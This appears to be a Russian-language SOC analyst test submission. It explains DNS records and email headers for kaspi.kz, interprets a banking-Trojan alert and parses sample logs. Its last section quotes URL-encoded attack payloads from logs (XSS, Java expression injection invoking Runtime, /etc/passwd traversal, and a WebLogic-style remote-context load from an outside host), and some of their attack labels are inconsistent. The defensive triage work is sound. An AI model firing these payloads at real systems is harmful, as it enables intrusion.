Серғазы Мәди Дарханұлы COPYRITING  (©) 2023 

1.       Сделать описание каждой строчке результата https://2whois.ru/?t=dns&data=kaspi.kz;


Это результат DNS-запроса для домена "kaspi.kz". Каждая строка результата представляет собой отдельный тип записи, который был получен с DNS-серверов.

kaspi.kz IN A ip = 194.187.245.10 85 сек. - Это запись типа "A", которая определяет IPv4-адрес для домена "kaspi.kz". IP-адрес этого домена - 194.187.245.10, а TTL (time-to-live) для этой записи - 85 секунд.

kaspi.kz IN NS target = ns.bc.kz 179 сек. - Это запись "NS", которая определяет серверы имен для домена "kaspi.kz". Сервером имен для этой записи является "ns.bc.kz", а TTL для этой записи составляет 179 секунд.

kaspi.kz IN NS target = ns.kaspi.kz 179 сек. - Это еще одна запись "NS", которая указывает другой сервер имен для домена "kaspi.kz". Сервером имен для этой записи является "ns.kaspi.kz", а TTL для этой записи составляет 179 секунд.

kaspi.kz IN NS target = ns2.bc.kz 179 сек. - Это еще одна запись "NS", которая указывает еще один сервер имен для домена "kaspi.kz". Сервером имен для этой записи является "ns2.bc.kz", а TTL для этой записи составляет 179 секунд.

kaspi.kz IN NS target = ns2.kaspi.kz 179 сек. - Это еще одна запись "NS", которая указывает еще один сервер имен для домена "kaspi.kz". Сервером имен для этой записи является "ns2.kaspi.kz", а TTL для этой записи составляет 179 секунд.

kaspi.kz IN SOA mname = ns.bc.kz rname = telecomdev.kaspi.kz serial = 2018122633 refresh = 600 retry = 150 expire = 28800 minimum-ttl = 300 217 сек. - Это запись "SOA", которая указывает информацию о начале полномочий для домена "kaspi.kz". Эта запись определяет основной сервер имен как "ns.bc.kz", контактный адрес электронной почты как "telecomdev.kaspi.kz", и различные другие параметры, такие как серийный номер, частота обновления и время жизни.

kaspi.kz IN MX pri = 10 target = bmss-01d.kaspi.kz 300 сек. - Это запись "MX", которая определяет почтовые серверы для домена "kaspi.kz". Эта запись указывает, что приоритет равен 10, а почтовый сервер для этой записи - "bmss-01d.kaspi.kz". TTL для этой записи составляет 300 секунд.

kaspi.kz IN MX pri = 10 target = bmss-02d.kaspi.kz 300 сек. - Это еще одна запись "MX", которая указывает другой почтовый сервер для домена "kaspi.kz". Эта запись указывает, что приоритет равен 10, а почтовый сервер для этой записи - "bmss-02d.kaspi.kz". TTL для этой записи составляет 300 секунд.

`kaspi.kz IN TXT txt = google-site-verification=x-9S3SCWGLPV4449a3riJHAdsBWLD44A8YGr



2.       Разобрать Email Header (разобрать и описать только нужные значения и потом суметь объяснить их применимость);
Email  Header
Это заголовок электронной почты, в котором содержится подробная информация о том, как было передано и получено письмо. Вот краткое объяснение различных полей этого заголовка:

Получено: Это стандартный заголовок, который показывает путь, который прошло письмо от места отправления до места назначения. В данном случае он показывает, что письмо было получено на exch3.localhost (IP-адрес 10.1.1.1), затем передано на exch3.localhost (IP-адрес 10.1.1.1) и, наконец, на nodename.kaspi.kz (IP-адрес 10.1.1.2).
Received-SPF: Этот заголовок показывает результат проверки Sender Policy Framework (SPF) для письма. Он показывает, что письмо прошло проверку SPF для домена "visa.com", что означает, что IP-адрес отправляющего сервера (198.241.159.88) уполномочен отправлять электронные письма от имени этого домена.
Authentication-Results: Этот заголовок показывает результаты различных проверок подлинности, проведенных над электронной почтой. Он показывает, что письмо прошло проверки SPF и DKIM (DomainKeys Identified Mail), и что политика DMARC (Domain-based Message Authentication, Reporting, and Conformance) для домена "visa.com" установлена на "карантин", но это конкретное письмо было пропущено.
Остальные заголовки не так важны в данном конкретном случае, но, похоже, они содержат закодированный текст (возможно, сообщение или вложение) и дополнительные заголовки (IPHdr) без четкого назначения.


3.       От системы получено уведомление «JobSFMail-Date.Hash.txt» что оно значит (нужно расписать как ты понимаешь данное уведомление и к чему оно может привести);
JobSFMail

Исходя из предоставленной информации, похоже, что система обнаружила исходящие соединения с IP-адреса 10.1.22.33 на два разных IP-адреса, 34.202.85.54 и 54.164.20.117, на порты 80. Эти соединения были отмечены как вредоносные и связаны с вариантом вредоносной программы Win.Trojan.Banker. Уведомление также содержит уникальный идентификатор "JobSFMail-Date.Hash.txt", который может быть использован для отслеживания или идентификации события для дальнейшего анализа или расследования.

В целом, данное уведомление указывает на возможную компрометацию системы или сети вредоносным ПО Trojan.Banker, и могут потребоваться дальнейшие действия для расследования и снижения потенциальной угрозы. Возможно, необходимо предпринять шаги по изоляции пораженной системы, локализации инфекции и, возможно, провести криминалистический анализ для определения источника и масштабов компрометации. Кроме того, в зависимости от серьезности и характера инцидента может потребоваться оповещение других соответствующих сторон, например, сотрудников службы ИТ-безопасности или правоохранительных органов.

4.           На сайте https://regex101.com/ разобрать «Пример логов 1.txt» и дать описание полезным по вашему мнению полям (Имя пользователя, IP адреса и порты источника и назначения, какое событие, статусы и т.д.);

#1 NGINX:
Полезные поля:

IP-адрес источника: 10.1.2.3
IP-адрес назначения: 109.166.59.44
Временная метка: [17/Nov/2019:03:17:59 +0600]
Метод запроса: GET
Запрашиваемый URL: /shop-ext/suggestions/?i=productDetails&m=true&t=IP&pi=14701657&u=3729495
Код состояния HTTP: 200
Referrer: https://kaspi.kz/shop/p/gerbor-vusher-reg1w2d2s-13-9-l-p-nimfea-al-ba-belyi-gljanets-14701657/?c=551010000
Пользовательский агент: Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36
Время отклика: 0.009
Время отклика бэкенда: 0.008
IP-адрес и порт назначения: 10.2.3.4:9001
#2 Почтовый журнал:
Полезные поля:

Временная метка: Dec 04 12:22:00
Источник журнала: Mail_Logs
Тип события: Информация
SMTP ICID: 11444342
Интерфейс: MAIL
IP-адрес источника: 172.1.2.3
IP-адрес назначения: 62.141.46.147
Хост обратного DNS: s2.kipersam.art
Проверено: да
#3 Прокси-сервер:
Полезные поля:

Заголовок Syslog: <30>Dec 4 12:21:59 mwg-prx1 mwg:
Тип события: LEEF:1.0
PRXName: Веб-шлюз
Версия: 7.8.2.11.0
DevTime: 1575440519000
IP-адрес источника: 10.7.8.9
Имя пользователя: petrov_123
Пользовательский агент: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Код состояния HTTP: 200
IP-адрес назначения: 149.154.167.99
Категории URL: Мгновенные сообщения
URL: https://venus.web.telegram.org/apiw1
#3 ASA:
Полезные поля:

Заголовок Syslog: <166>Dec 04 2019 12:21:59 ASA1234 :
Причина отказа: Отказ TCP (нет соединения)
IP-адрес источника: 90.143.47.21
Порт источника: 42968
IP-адрес назначения: 194.187.247.147
Порт назначения: 443
Флаги: ACK
Интерфейс: внешний
#4 Журнал почты:
Полезные поля:

Временная метка: Dec 04 12:22:00
Источник журнала: Mail_Logs
Тип события: Информация
ICID: 11444342
Принять/отклонить: ПРИНЯТЬ СПИСОК ПОДОЗРЕВАЕМЫХ SG / ОТКЛОНИТЬ ЧЕРНЫЙ СПИСОК SG
SBRS: sbrs[-3.0:-1.0] / sbrs[-10.0:-3.0]
Оценка SBRS: -1.6 / -5.5
Страна: Mongolia

Этот журнал содержит информацию о событии FILE_MALWARE_EVENT, которое было записано устройством с DeviceType=Estreamer и DeviceAddress=10.10.10.1 в CurrentTime=1575440517963. Журнал включает следующие поля:

timestamp: дата и время, когда произошло событие (04 Dec 2019 12:21:55)
fileEventData.sourceAddress: IP-адрес источника (172.2.3.4)
fileEventData.sourcePort: порт источника (46037)
fileEventData.destinationAddress: IP-адрес назначения (172.2.3.5)
fileEventData.destinationPort: порт назначения (30)
fileEventData.protocol: используемый протокол (6)
fileEventData.fileName: имя файла, вызвавшего событие (online_126657052_3.pdf)
fileEventData.disposition: назначение события (2)
fileEventData.speroDisposition: расположение события в Spero (4)
fileEventData.fileStorageStatus: статус файла в хранилище (2)
fileEventData.fileAnalysisStatus: статус анализа файла (2)
fileEventData.localMalwareAnalysisStatus: статус анализа локального вредоносного ПО (5)
fileEventData.threatScore: оценка угрозы события (0)
fileEventData.action: действие, предпринятое в ответ на событие (3)
fileEventData.clientAppId: идентификатор клиентского приложения (2634)
fileEventData.application.serviceId: идентификатор используемой службы приложения (836)
fileEventData.application.serviceName: имя используемой службы приложения (SMTP)
fileEventData.user.userId: идентификатор пользователя, вызвавшего событие (9999997)
fileEventData.user.userName: имя пользователя, вызвавшего событие (аутентификация не требуется).
Полезные поля в этом журнале, вероятно, будут включать IP-адреса и порты источника и назначения, а также имя файла, расположение и действие, предпринятое в ответ на событие. Другие поля, такие как статус анализа файла и оценка угрозы, также могут быть полезны в определенных контекстах.



5.           В файле «Пример запросов.txt» отделить легитимные запросы от запросов, очевидно содержащих попытки эксплуатации известных уязвимостей. Написать IP адреса атакующих, какого класса уязвимости они пытались использовать.
Пример запросов

85.117.101.213 GET https://data.kaspi.lab/market/api/v2/orders
payload = %3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E
potential_attack = XSS(Reflected)

81.91.187.59 POST https://new.kaspi.lab/bottles/dashboards/
payload = actionoutcome%3D%2Fpwn.xhtml%3Fpwned%3D%23%7Bexpressions.getclass%28%29.forname%28%27java.lang.runtime%27%29.getdeclaredmethods%28%29%5B0%5D%7D
pottential_attack = SSTI via uploaded shell

vrode 78.109.191.117 hz krch ne ponyatno chei ip tupo kashu skinuli
payload = view%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
potential_attack = Path traversal

payload = _nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackaged.springframework.context.support.classpathxmlapplicationcontext%28%22http%3A%2F%2F8.8.8.8%3A37225%22%29 kaspi.lab
potential_attack = vrode os injection ili SSTI + SSRF


Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36 %3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E kaspi.lab                
pottential_attack = XSS(Reflected)


2023-02-15T08:32:00	dev.kaspi.lab 443 78.109.191.117 10.2.50.21	80	POST /page/api/login/	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(Linux;+Android+12;+SM-A315F+Build/SP1A.210812.016;+wv)	view%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd	kaspi.lab
pottential_attack = LFI

2023-02-15T08:32:00	forum.kaspi.lab 443	79.133.190.153 10.2.1.12	80	POST	/bottles/dashboardapi2/api/v1/Dashboard/getSampleRequest	-	200	2265	2780	0	2479	16947	HTTP/1.1	Mozilla/5.0+(iPhone;+CPU+iPhone+OS+13,4+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Mobile/15E148	_nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackaged.springframework.context.support.classpathxmlapplicationcontext%28%22http%3A%2F%2F8.8.8.8%3A37225%22%29	kaspi.lab
pottential_attack = Reverse Shell (Reverse TCP, connect-back)


2023-02-15T08:32:00 data.kaspi.lab 443 85.117.101.213 10.2.1.12 80 GET /market/api/v2/orders - 200 2265 2780 0 2479 16947 HTTP/1.1 Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36 %3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E kaspi.lab
pottential_attack = xss
